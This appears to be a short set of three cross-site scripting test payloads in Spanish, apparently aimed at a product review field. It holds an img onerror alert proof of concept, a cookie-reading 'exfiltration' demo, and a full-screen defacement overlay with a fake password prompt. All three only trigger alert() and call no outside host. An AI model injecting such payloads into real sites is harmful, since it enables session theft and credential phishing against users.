Case 1:

Me encantó este producto. <img src="x" onerror="alert('¡Vulnerabilidad XSS confirmada!')" />

Case 2 - Exfiltration

document.cookie = "session_token=Admin_Super_Secreto_12345; path=/";

<img src="x" onerror="alert('Enviando cookie al servidor del atacante: ' + document.cookie)" />

Case 3 - Defacement:

<div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,0.9); color: #6d59e0; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: monospace;">
  <h1 style="font-size: 3em;">SISTEMA COMPROMETIDO</h1>
  <p>Por favor, inicie sesión nuevamente para verificar su identidad:</p>
  <input type="password" placeholder="Contraseña..." style="padding: 10px; font-size: 1.2em;" />
  <button onclick="alert('Credenciales robadas y enviadas al atacante')">Verificar</button>
</div>
